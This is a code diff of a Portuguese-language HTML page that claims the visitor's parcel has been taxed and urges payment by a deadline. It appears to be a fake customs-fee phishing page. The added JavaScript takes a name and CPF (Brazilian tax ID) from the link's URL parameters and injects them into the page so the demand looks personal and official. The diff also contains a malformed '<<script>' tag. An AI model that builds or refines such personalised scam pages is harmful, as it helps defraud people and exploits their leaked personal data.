@@ -21,6 +21,18 @@
     <link rel="dns-prefetch preconnect" href="https://www.greatpages.com.br" crossorigin="">
     <style type="text/css" id="operaUserStyle"></style>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;1,400;1,700&family=Open+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet" media="all">
+	
+	<style>
+	  .campo {
+		position: absolute;
+		z-index: 99;
+		background: transparent; /* <- Fundo transparente */
+		padding: 4px 10px;
+		font-size: 12px;
+		font-family: Arial, sans-serif;
+		color: #000; /* Ou branco (#fff), dependendo do fundo da imagem */
+	  }
+	</style>
 </head>
 
 <body class="">
@@ -34,26 +46,25 @@
                 <div id="e_1225979_1_57686_m" class="gpc-e e_imagem dm e_1225979_1_57686">
                     <div class="c imagem e_imagem">
                         <div class="imagem_fundo"></div>
+						
+					  <div class="campo" style="top: 163px; left: -28px;" id="nome-wrapper">
+						<span id="campo-nome"></span>
+					  </div>
+
+					  <div class="campo" style="top: 210px; left: -8px;" id="cpf-wrapper">
+						<span id="campo-cpf"></span>
+					  </div>
                     </div>
                 </div>
-                <div id="e_1225979_1_60477_m" class="gpc-e e_texto dm dm e_1225979_1_60477" style="white-space: normal;">
-                    <div class="c e_texto" style="white-space: normal;">
-                        <p><span><br></span></p>
-                        <p><span><br>Nome não disponível</span></p>
-                    </div>
-                </div>
-                <div id="e_1225979_1_51231_m" class="gpc-e e_texto dm dm e_1225979_1_51231" style="white-space: normal;">
+                
+				<div id="e_1225979_1_51231_m" class="gpc-e e_texto dm dm e_1225979_1_51231" style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
                         <br>
                         <br>
                         <p style="white-space: normal;"><span><b>ENCOMENDA TRIBUTADA</b></span></p>
                     </div>
                 </div>
-                <div id="e_1225979_1_75116_m" class="gpc-e e_texto dm dm e_1225979_1_75116" style="white-space: normal;">
-                    <div class="c e_texto" style="white-space: normal;">
-                        <p><span><br><br></span></p>
-                        CPF não disponível                    </div>
-                </div>
+
                 <div id="e_1225979_1_83162_m" class="gpc-e e_texto dm dm e_1225979_1_83162" style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
                         <p><b> Sua encomenda foi TRIBUTADA</b></p>
@@ -87,15 +98,28 @@
                                     Pagamento</a></b></h2>
                     </div>
                 </div>
-                <div id="e_1225979_1_65553" class="gpc-e e_texto dd dm e_1225979_1_65553" style="white-space: normal;">
-                    <div class="c e_texto" style="white-space: normal;">
-                        <p><span>Nome Completo:</span></p>
-                        <p><span><b>Nome não disponível<br><br></b>CPF:<b> CPF não disponível<br><br></b>Prazo para
-                                regularização:<b>
-                               </b></span></p><p><b><span>08/04/2025</span></b></p><b>
-</b><p></p>
-                    </div>
-                </div>
+                
+				
+			<div class="gpc-e e_texto dd dm e_1225979_1_65553" id="e_1225979_1_65553" style="white-space: normal;">
+			  <div class="c e_texto" style="white-space: normal;">
+
+				<p style="color: #1d4e89; font-size: 16px; margin-bottom: 4px;">Nome Completo:</p>
+				<p id="campo-nome-2" style="font-weight: 700; font-size: 18px; margin-bottom: 16px;">Nome não disponível</p>
+
+				<p style="font-size: 16px; margin-bottom: 4px;">CPF: <span id="campo-cpf-2" style="font-weight: 700;">CPF não disponível</span></p>
+				<p style="margin-bottom: 16px;"></p>
+				
+
+				<p style="font-size: 16px; margin-bottom: 4px;">Prazo para regularização:</p>
+				<p style="font-weight: 700; font-size: 16px; margin: 0;">15/03/2025</p>
+				
+				
+
+			  </div>
+			</div>
+
+				
+				
                 <br><br>
                 <div id="e_1225979_1_28606" class="gpc-e e_botao dd dm e_1225979_1_28606" style="white-space: normal;">
                     <br>
@@ -172,6 +196,7 @@
             </div>
         </div>
     </div>
+	
      <script>
                         const hoje = new Date();
                         const dia = String(hoje.getDate()).padStart(2, '0');
@@ -200,9 +225,29 @@
             z-index: 999999;
         }
     </style>
+	
+<<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const params = new URLSearchParams(window.location.search);
+    let nome = decodeURIComponent(params.get("nome") || "");
+    let cpf = params.get("cpf") || "";
 
+    // Formatar nome (primeira letra maiúscula de cada palavra)
+    nome = nome.toLowerCase().replace(/\b\w/g, l => l.toUpperCase());
 
+    // Formatar CPF: 12345678900 → 123.456.789-00
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length === 11) {
+      cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
 
-
+    // Inserir valores no HTML
+    document.getElementById("campo-nome").textContent = nome;
+    document.getElementById("campo-cpf").textContent = cpf;
+	
+	document.getElementById("campo-nome-2").textContent = nome;
+    document.getElementById("campo-cpf-2").textContent = cpf;
+  });
+</script>
 
 </body></html>
